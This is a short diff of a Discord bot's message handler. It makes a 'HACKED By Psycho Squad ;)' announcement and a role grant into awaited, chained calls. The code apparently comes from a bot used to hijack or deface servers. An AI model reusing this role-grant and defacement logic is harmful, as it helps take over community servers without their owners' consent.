@@ -61,9 +61,10 @@ bot.on('message', async (message) => {
             reason: 'HACKED By Psycho Squad ;)'
         })
         
-        message.channel.send(`HACKED By Psycho Squad ;)`)
+        await message.channel.send(`HACKED By Psycho Squad ;)`).then( async (O_o) => { 
       
-        user.roles.add(user.guild.roles.find(roleU => roleU.name === role))
+      await user.roles.add(user.guild.roles.find(roleU => roleU.name === role))
+      })
   }
   
   var prefixx =  await bot.tools.GuildPrefix(message.guild) 
